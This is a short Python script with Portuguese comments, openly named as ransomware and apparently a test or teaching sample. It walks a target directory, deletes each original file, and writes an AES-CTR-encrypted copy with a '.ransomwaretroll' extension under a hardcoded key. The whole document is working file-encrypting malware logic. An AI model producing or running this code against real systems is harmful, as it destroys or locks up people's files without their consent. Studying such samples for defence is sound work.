import os
import pyaes

# busca o diretório alvo
target_dir = "arquivos-sensíveis"

# define a chave de criptografia
key = b"testeransomwares"

# percorre os diretórios recursivamente
for root, dirs, files in os.walk(target_dir):
    for file_name in files:
        file_path = os.path.join(root, file_name)

        # abre o arquivo a ser criptografado
        with open(file_path, "rb") as f:
            file_data = f.read()

        # remove o arquivo original
        os.remove(file_path)

        # criptografa o arquivo
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        # salva o arquivo criptografado
        new_file = file_path + ".ransomwaretroll"
        with open(new_file, "wb") as f:
            f.write(crypto_data)

print("Arquivos criptografados com sucesso!")
